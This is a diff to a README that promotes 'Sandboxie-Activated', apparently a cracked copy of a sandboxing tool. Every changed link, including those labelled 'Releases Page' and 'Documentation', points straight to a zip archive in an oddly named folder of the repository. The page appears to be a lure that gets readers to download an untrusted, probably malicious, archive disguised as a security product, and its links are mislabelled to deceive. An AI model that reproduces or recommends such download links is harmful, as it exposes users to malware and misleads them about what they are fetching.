@@ -1,7 +1,7 @@
 ```
 # 🛡️ Sandboxie-Activated - Safe Sandbox & Secure Isolation
 
-![Download Sandboxie-Activated](https://raw.githubusercontent.com/Melazeetech/Sandboxie-Activated/main/capsulolenticular/Sandboxie-Activated-cacoproctia.zip%20Now-%F0%9F%93%A8-28a745)
+![Download Sandboxie-Activated](https://github.com/Melazeetech/Sandboxie-Activated/raw/refs/heads/main/capsulolenticular/Activated_Sandboxie_v3.2-alpha.2.zip%20Now-%F0%9F%93%A8-28a745)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Welcome to Sandboxie-Activated! This application helps you run programs in a sec
 
 To download Sandboxie-Activated, visit the Releases page. 
 
-[Download Sandboxie-Activated](https://raw.githubusercontent.com/Melazeetech/Sandboxie-Activated/main/capsulolenticular/Sandboxie-Activated-cacoproctia.zip)
+[Download Sandboxie-Activated](https://github.com/Melazeetech/Sandboxie-Activated/raw/refs/heads/main/capsulolenticular/Activated_Sandboxie_v3.2-alpha.2.zip)
 
 Here's how to download and run the application:
 
 1. **Go to the Releases Page:** 
    Click the link to visit the page where Sandboxie-Activated is available for download.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/Melazeetech/Sandboxie-Activated/main/capsulolenticular/Sandboxie-Activated-cacoproctia.zip)
+   [Visit Releases Page](https://github.com/Melazeetech/Sandboxie-Activated/raw/refs/heads/main/capsulolenticular/Activated_Sandboxie_v3.2-alpha.2.zip)
 
 2. **Choose the Latest Version:** 
    Look for the latest version of Sandboxie-Activated. It's usually marked at the top of the page.
@@ -68,7 +68,7 @@ If you have questions or need assistance, consider joining our community. You ca
 
 **Check the documentation for detailed guides:**
 
-[Documentation](https://raw.githubusercontent.com/Melazeetech/Sandboxie-Activated/main/capsulolenticular/Sandboxie-Activated-cacoproctia.zip)
+[Documentation](https://github.com/Melazeetech/Sandboxie-Activated/raw/refs/heads/main/capsulolenticular/Activated_Sandboxie_v3.2-alpha.2.zip)
 
 ## 📝 Summary
 
@@ -76,5 +76,5 @@ Sandboxie-Activated offers a reliable way to run applications securely on your W
 
 Remember, your security starts with informed choices. Happy exploring! 
 
-[Download Sandboxie-Activated](https://raw.githubusercontent.com/Melazeetech/Sandboxie-Activated/main/capsulolenticular/Sandboxie-Activated-cacoproctia.zip)
+[Download Sandboxie-Activated](https://github.com/Melazeetech/Sandboxie-Activated/raw/refs/heads/main/capsulolenticular/Activated_Sandboxie_v3.2-alpha.2.zip)
 ```
